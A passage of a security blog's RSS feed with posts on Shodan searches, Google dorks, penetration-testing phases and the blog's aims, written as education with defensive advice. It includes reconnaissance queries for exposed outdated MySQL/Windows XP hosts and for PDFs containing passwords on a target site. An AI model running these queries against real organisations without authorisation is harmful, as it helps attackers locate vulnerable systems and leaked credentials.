&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/axis.png&quot;&gt;&lt;img src=&quot;/images/shodan/axis.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The above image shows the results page; on the left side of the screen we have five interesting groups (they change depending on the query):&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;Top countries;&lt;/li&gt;
	&lt;li&gt;Top services;&lt;/li&gt;
	&lt;li&gt;Top organizations;&lt;/li&gt;
	&lt;li&gt;Top operating systems;&lt;/li&gt;
	&lt;li&gt;Top products.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them reports the top five; for example, the first one shows the top five countries having the major number of devices of that type.
On the right side, each result is reported with the corresponding device IP address (which I have partially blacked out for privacy reasons) and the &lt;em&gt;body text area&lt;/em&gt; which represents device response. By clicking on a device a new page opens up with more detailed informations, including a map showing the geolocation using Mapbox API (omitted in the next image).&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/axis_detail.png&quot;&gt;&lt;img src=&quot;/images/shodan/axis_detail.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Moreover, it is possible to generate reports by clicking on “Create Report”:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/top_countries.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_countries.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_services.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_services.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_organizations.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_organizations.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_products.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_products.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_versions.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_versions.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_domains.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_domains.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/ssl_versions.png&quot;&gt;&lt;img src=&quot;/images/shodan/ssl_versions.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/ssl_chain_lenght.png&quot;&gt;&lt;img src=&quot;/images/shodan/ssl_chain_lenght.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;
&lt;a href=&quot;/images/shodan/top_operating_systems.png&quot;&gt;&lt;img src=&quot;/images/shodan/top_operating_systems.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The other important feature is represented by filters; they are really useful to improve the search, just like we saw for Google advanced search operators. Some of them are reported next:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;country - filters by two letters country code (e.g. US, JP, FR, IT, RU);&lt;/li&gt;
	&lt;li&gt;city - filters by city name;&lt;/li&gt;
	&lt;li&gt;hostname - filters by hostname or domain;&lt;/li&gt;
	&lt;li&gt;net - filters by IP range (CIDR notation);&lt;/li&gt;
	&lt;li&gt;product - filters by technology (es. MySQL, Apache, IIS, Nginx);&lt;/li&gt;
	&lt;li&gt;os - filters by operating system;&lt;/li&gt;
	&lt;li&gt;port - filters by specific port;&lt;/li&gt;
	&lt;li&gt;org - filters by organization;&lt;/li&gt;
	&lt;li&gt;geo - filters by geographic coordinates;&lt;/li&gt;
	&lt;li&gt;after/before - filters by date (format dd/mm/yyyy and dd-mm-yy).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The application of filters can be done by clicking on the items on the left contained in the top five groups seen before or manually in the search form by specifying the query in this way (example search for SSH port):&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port:22
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Remember that making a search without filters, it is equivalent to tell to the engine to look for the requested information in the body text area.&lt;/p&gt;

&lt;p&gt;If we want to find all MySQL servers in USA, the query will be:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;product:&quot;MySQL&quot; country:&quot;US&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;On the left side of the results page we get two interesting groups: top operating systems and top versions.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/mysql_us.png&quot;&gt;&lt;img src=&quot;/images/shodan/mysql_us.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;They can be used to apply other two filters; for example, we can choose to search for old Windows XP operating systems (!) and then 5.1.71-community version of MySQL (this version appears on the left after filtering by O.S.):&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;country:&quot;US&quot; product:&quot;MySQL&quot; os:&quot;Windows XP&quot; version:&quot;5.1.71-community&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;There is also an interesting application, available at https://maps.shodan.io, through which we can even look at a map with pinpoints indicating the geolocation of devices, in this case public MySQL servers in USA:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/shodan_maps.png&quot;&gt;&lt;img src=&quot;/images/shodan/shodan_maps.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In terms of Industrial Control Systems (ICS), Shodan has also a pretty nice informative animated graph called Shodan ICS Radar showing a worldwide display of ICS accessible via web:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/shodan/ics_radar.png&quot;&gt;&lt;img src=&quot;/images/shodan/ics_radar.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I suggest to experiment with filters of all types to get familiar with queries and take advantage of the full potential of this search engine. Shodan can be a very useful tool to verify if a company network has critical nodes publicly exposed or not properly configured.&lt;/p&gt;

&lt;p&gt;Bonus query:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;has_screenshot:true
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 25 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/25/information-gathering-with-shodan.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/25/information-gathering-with-shodan.html</guid>
        
        <category>Information gathering</category>
        
        <category>Shodan</category>
        
        <category>IoT</category>
        
        <category>OSINT</category>
        
        
      </item>
    
      <item>
        <title>Information Gathering with Google Search Engine</title>
        <description>&lt;p&gt;Generally, when we want to search for a particular argument, we open up our favourite browser, navigate to a Web Search Engine and type in some words related to that matter. Depending from how good we set up the research, we obtain more or less pertinent results.&lt;/p&gt;

&lt;p&gt;Basically, everytime we launch a search we make a query to the web search engine: there are some particular expressions known to the engine, called Advanced Search Operators, which make a search more effective. Queries built like these are also called “Google dorks”.&lt;br /&gt;
&lt;!--more--&gt;
For example, we can make a simple search for “cyber security” using Google Search Engine:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/google_search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By doing this we obtain a good amount of informations about the argument; note that we could achieve the same result by using the following url instead of compiling the search form:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.google.com/search?q=cyber+security
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;b&gt;Google Advanced Search Operators and Special Search Characters&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;What if we want to do a more specific query, like obtaining all the results for that topic from a particular website? Here come advanced search operators.
Suppose we want to analyze results coming from NIST (National Institute of Standards and Technology) for that topic; then the query should be:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:nist.gov &quot;cyber security&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The operator “site:” asks to the engine to show all the results associated to the website (which represent the argument of the operator) reported after the colon symbol; beware that there must be no space between the colon symbol and the argument of the operator.
In addition to search operators, there are special search characters like the double quotes used before to search phrases or terms composed by more than one word.&lt;/p&gt;

&lt;p&gt;A pretty good list of Google advanced search operators is this one from DEFCON 2005 Conference:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/google_search_operators.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List for special search characters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;( + ) force inclusion of something common;&lt;/li&gt;
  &lt;li&gt;( - ) exclude a search term;&lt;/li&gt;
  &lt;li&gt;( &quot; ) use quotes around search phrases;&lt;/li&gt;
  &lt;li&gt;( . ) a single-character wildcard;&lt;/li&gt;
  &lt;li&gt;( * ) any word;&lt;/li&gt;
  &lt;li&gt;( &amp;amp; ) boolean &#39;AND&#39;;&lt;/li&gt;
  &lt;li&gt;( | ) boolean &#39;OR&#39;;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The special char “-“ is really interesting for listing subdomains. Considering the next query we obtain a list of the subdomains of nist.gov:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/nist_search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Adding more “-“ condition allows to crawl even deeper: keep in mind that Google ranks the results, so the most searched stuff lies at the top, i.e. in the first pages, while the most interesting informations (from an attacker point of view) can be found at the bottom.&lt;/p&gt;

&lt;p&gt;Now we will look for something more interesting in terms of confidential informations; suppose we want to know if in a certain website there is a PDF document containing the word “password”. For this purpose, we query Google with the following request:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:www.nameoftargetsite.com filetype:pdf intext:password
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The meaning of the previous line is explained next: the first operator is well known; the “filetype:” directive tells Google we want to search all the files with a particular extension, in this case PDF. Lastly, we add a third condition which makes the engine search for a specific word in the text.
So, interpreting the whole query: we are asking to search through the site www.nameoftargetsite.com all PDF documents containing the word “password”.&lt;/p&gt;

&lt;p&gt;You can easily see how powerful this syntax is and you will be surprised by discovering the amount of confidential informations left to public access.
This is why it is important to configure properly the access to informations hosted on the net, for example in a website. However, if not really needed, it is a good practice to avoid hosting of confidential documents on websites, since they are the first contact point for attackers.&lt;/p&gt;

&lt;p&gt;If you want to take a look at a really good list of Google dorks I suggest you to visit the following website:
https://www.exploit-db.com/google-hacking-database&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;img src=&quot;/images/google_search/ghdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here you can search through the Google Hacking DataBase choosing the query category you are interested in and then simply use it to search through Google.
Keep in mind that this type of information gathering through search engine is a passive reconnaissance activity since we are not interacting directly with the systems; this helps to maintain a low profile making hard to be detected.&lt;/p&gt;

&lt;p&gt;All these search activities can be executed by using automatic tools, which leverage not only Google, but a huge variety of search engines and social network platforms; we will take a look at some of them in the next posts.&lt;/p&gt;
</description>
        <pubDate>Mon, 18 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/18/information-gathering-with-google-search-engine.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/18/information-gathering-with-google-search-engine.html</guid>
        
        <category>Information gathering</category>
        
        <category>Google advanced search operators</category>
        
        <category>OSINT</category>
        
        
      </item>
    
      <item>
        <title>Main Steps of an Attack</title>
        <description>&lt;p&gt;Following a portion of the phases presented in the Penetration Testing Execution Standards (PTES), which represents a technical guideline for performing a penetration test, i.e. a simulation of a real attack against a certain target, we will focus on the theory and practice behind the following main steps:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Information gathering or reconnaissance;&lt;/li&gt;
  &lt;li&gt;Vulnerability analysis;&lt;/li&gt;
  &lt;li&gt;Exploitation;&lt;/li&gt;
  &lt;li&gt;Post-exploitation.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since these steps mimic how the attacker thinks and acts, performing this process via previous authorization is also called “Ethical Hacking”.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/main_phases.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Information gathering&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;There is a huge amount of informations we can acquire about a certain target by simply crawling the Internet using proper searches and tools, namely &lt;i&gt;passive reconnaissance&lt;/i&gt;; this type of information gathering is really safe for the attacker: in fact, since it does not interact directly with the systems because it uses only web search engines, it is difficult to detect.&lt;/p&gt;

&lt;p&gt;Understanding how it is important to limit the visibility of our personal informations is a first important step in the road to security. Many times users are the same ones giving the attackers a huge help by simply leaving personal data publicly available on the net.&lt;/p&gt;

&lt;p&gt;On the other side, &lt;i&gt;active reconnaissance&lt;/i&gt; is more invasive and can trigger alerts on Intrusion Detection Systems (IDS), but gives a lot more specific informations such as version of operating system and applications running on target machine, services and open ports.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Vulnerability Analysis&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Once we have collected enough informations about the target, we can start analyzing vulnerabilities, i.e. security flaws in target systems. Even if understanding how to find vulnerabilities by ourselves is important (especially in a security research perspective), sometimes it can be useful to take advantage of automatic tools for scanning a certain system in order to find known security issues, especially if the time available to discover them is limited. This is why we will look at some useful tools called Vulnerability Scanners: they namely scan the target, mostly in a invasive way, to check if there are known vulnerabilities or software misconfigurations; by probing hosts, scanners look for active addresses, open ports, operative systems, running applications versions and so on.&lt;br /&gt;
Finally they report results in a document.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Exploitation&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Finding a vulnerability does not necessarily mean we can exploit it to compromise systems or accounts: this is where the art of exploitation takes place and where the attacker shows his knowledge, capability and creativity.&lt;/p&gt;

&lt;p&gt;We will go from Web Application testing (such as SQL Injection, Cross-Site Scripting, Local/Remote File Inclusion) to Client-side exploitation taking advantage of vulnerabilities in the software installed on target machines in order to compromise them by taking the control.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Post-exploitation&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Once the access to the system is obtained, the attacker can start the real intrusion: in fact, this is where the concrete attack starts. Generally, one of the first things to do is to try to escalate privileges, i.e. getting full access to all folders and files on the system so as to exfiltrate as much data as possible. Furthermore the attacker may want to be able to reconnect back to the compromised system whenever he wants to, so another post-exploitation activity could be the implemetation of the so called “persistence”.
Moreover, if the compromised system is connected to other systems it is possible to leverage this feature to get access to other devices connected to the same network interface subnet.&lt;/p&gt;

&lt;p&gt;This is just a high-level view of how an attacker plans and executes an attack; we will perform in detail these steps in a virtual laboratory environment on intentionally vulnerable machines created for didactic purpose.&lt;/p&gt;

&lt;p&gt;In the next articles, we will discuss about topics regarding these four macro-phases.&lt;/p&gt;

&lt;p&gt;References: &lt;a href=&quot;http://www.pentest-standard.org&quot;&gt;http://www.pentest-standard.org&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 11 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/11/main-steps-of-an-attack.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/11/main-steps-of-an-attack.html</guid>
        
        <category>Penetration test</category>
        
        <category>Information gathering</category>
        
        <category>Vulnerability analysis</category>
        
        <category>Exploitation</category>
        
        <category>Post-exploitation</category>
        
        
      </item>
    
      <item>
        <title>Introduction</title>
        <description>&lt;p&gt;The title of this blog is pretty self-explanatory: “Spread Security”, in other words, share knowledge to increase awareness.&lt;/p&gt;

&lt;p&gt;The reason why I started this project is because Information Security is a very interesting argument which is getting more and more critical as time goes by due to the growing presence of devices on the Internet.&lt;/p&gt;

&lt;p&gt;In this scenario it is important to understand what type of attacks are in the wild and how to secure our devices, i.e. our data, from malicious users trying to steal personal informations such as credentials and documents.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/cybersecurity.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Theory is fundamental in every discipline, but I think that to understand deeply some concepts it is a must to consider also practice.
This is why the idea here is to show theory of attacks followed by “hands-on” demonstrations performed on a virtual laboratory environment.&lt;/p&gt;

&lt;p&gt;Here is a brief list of the main arguments (from a high level point of view) treated in this blog, so you can have an idea of what you will find in this place:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Open Source Intelligence (OSINT);&lt;/li&gt;
  &lt;li&gt;Theory behind attacks;&lt;/li&gt;
  &lt;li&gt;Practical simulations of attacks in a virtual environment;&lt;/li&gt;
  &lt;li&gt;Malware Reverse Engineering;&lt;/li&gt;
  &lt;li&gt;Security best practices;&lt;/li&gt;
  &lt;li&gt;Suggestions on how to secure systems and networks.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I really hope you will find this blog useful, so enjoy the reading and see you in the next post.&lt;/p&gt;
</description>
        <pubDate>Mon, 04 Jul 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/07/04/introduction.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/07/04/introduction.html</guid>
        
        <category>ICT Security</category>
        
        
      </item>
    
  </channel>
</rss>

